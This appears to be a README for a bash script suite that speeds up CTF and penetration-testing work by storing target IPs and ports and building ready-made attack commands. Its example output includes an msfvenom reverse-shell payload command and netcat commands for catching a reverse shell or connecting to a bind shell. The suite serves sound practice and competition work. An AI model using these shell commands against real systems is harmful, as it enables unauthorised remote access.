# bash-pentesting-suite
## Suite of bash scripts for acceleration of CTF competitions

### Installation
Run as root:
```
# ./install.sh
```
Binary files will be copied to /bin/, dotfiles are generated by ```_options``` for each user.
### Initialization
Run as normal user:
```
$ _options
```
Will create dotfiles, set up necessary environment. 
### Scripts usage breakdown
The ```_target``` script saves IPv4 addresses, or changes IPv4 address if field already exists:
```
$ _target -t 127.0.0.1
```
This version saves another address with mark specified by ```-n``` flag:
```
$ _target -t 173.194.222.106 -n 1
```
The ```_port``` works the same as ```_target``` but saves port values:
```
$ _port -p 1337
```
Also can save more than one port as in ```-n``` flag:
```
$ _port -p 1337 -n 1
```
The ```_options``` script parses dotfile and prints saved information with some additions in following pattern:
- available network interfaces/your localhost corresponding IPv4's/gateway IPv4's
- saved target addresses/their status
- saved port integers
```
$ _options 
Localhost addresses:
eth0
    ip: 10.0.1.2
    gateway: 10.0.1.1
tun0
    ip: 10.10.14.207
    gateway: 10.10.14.1
Targets:
    127.0.0.1 UP
    173.194.222.106 UP
Ports:
    1337
    5432
``` 
The ```_pentest_assist``` script parses dotfile, substitutes variables' corresponding values, as a result constructing pentest commands specify with ```-m``` flag with which command you need help:
```
$ _pentest_assist -m useful-payloads
   ┌ Reverse shell payload for buffer overflow
1. msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.1.2 LPORT=1337 --platform linux --arch x86 --format c
State your choice: 1
```
Or:
```
$ _pentest_assist -m nc
   ┌ Catch reverse shell from exploited target:
1. nc -nlvp 1337
   ┌ Connect to bind shell on the exloited target:
2. nc 127.0.0.1 1337
State your choice: 2
```
